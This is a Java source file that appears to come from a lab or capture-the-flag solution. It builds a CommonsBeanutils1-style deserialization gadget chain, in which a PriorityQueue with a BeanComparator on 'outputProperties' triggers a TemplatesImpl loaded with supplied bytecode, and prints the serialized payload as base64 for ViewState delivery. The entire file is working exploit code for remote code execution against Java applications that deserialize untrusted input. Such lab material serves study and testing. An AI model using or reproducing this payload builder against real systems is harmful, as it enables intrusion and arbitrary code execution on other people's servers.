import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;

/**
 * Builds the CommonsBeanutils1-style chain used by the lab:
 *
 *   PriorityQueue(2, BeanComparator("outputProperties")) -> TemplatesImpl
 *
 * Prints the raw Java serialization stream as a single base64 line on stdout
 * (the same shape as the TEMPLATE constant in solution/solve.py - gzip and
 * ViewState encoding are added by the Python scripts).
 *
 * Run inside a JDK 8 container; see build.sh.
 */
public class BuildPayload {

    private static void set(Class<?> cls, Object target, String name, Object value)
            throws Exception {
        Field field = cls.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] translet = Files.readAllBytes(Paths.get(args[0]));

        TemplatesImpl templates = new TemplatesImpl();
        set(TemplatesImpl.class, templates, "_bytecodes", new byte[][]{translet});
        set(TemplatesImpl.class, templates, "_name", "Exploit");
        try {
            // transient on this JDK, kept for parity with ysoserial's builder
            set(TemplatesImpl.class, templates, "_tfactory", new TransformerFactoryImpl());
        } catch (Exception ignored) {
        }

        // property must be null while the strings are added, otherwise compare()
        // would fire the gadget at build time
        BeanComparator comparator = new BeanComparator(null);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        set(BeanComparator.class, comparator, "property", "outputProperties");

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] elements = (Object[]) queueField.get(queue);
        elements[0] = templates;
        elements[1] = templates;

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(queue);
        oos.close();

        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
